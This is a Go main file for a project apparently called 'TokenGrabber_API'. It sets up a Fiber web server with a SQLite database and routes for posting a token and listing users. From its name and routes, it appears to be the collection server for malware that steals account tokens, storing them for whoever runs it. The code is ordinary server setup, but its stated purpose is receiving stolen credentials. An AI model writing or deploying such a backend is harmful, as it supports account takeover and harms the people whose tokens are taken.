package main

import (
	"github.com/bytixo/TokenGrabber_API/database"
	"github.com/bytixo/TokenGrabber_API/user"
	"github.com/joho/godotenv"
	"github.com/pieterclaerhout/go-log"
	"os"

	"github.com/gofiber/fiber/v2"
	"github.com/gofiber/fiber/v2/middleware/logger"
	"gorm.io/driver/sqlite"
	"gorm.io/gorm"
)

func main() {

	godotenv.Load()
	log.DebugMode = true
	log.DebugSQLMode = true
	log.PrintTimestamp = true
	log.PrintColors = true
	log.TimeFormat = "[2006-01-02 15:04:05.000]"

	app := fiber.New()
	app.Use(logger.New())

	initDatabase()
	setupRoutes(app)
	port := os.Getenv("PORT")
	log.Fatal(app.Listen(port))

}

func setupRoutes(app *fiber.App) {
	app.Post("/api/token", user.SingleToken)
	app.Get("/api/users", user.GetUsers)
}

func initDatabase() {
	var err error
	database.DBConn, err = gorm.Open(sqlite.Open("users.db"), &gorm.Config{
		PrepareStmt:            false,
		SkipDefaultTransaction: true,
	})
	if err != nil {
		panic("Failed to connect to database")
	}
	log.Info("Successfully connected to database")

	err = database.DBConn.AutoMigrate(&database.User{})
	if err != nil {
		log.Error("Couldn't migrate database", err)
	}
	log.Info("Database Migrated")
}
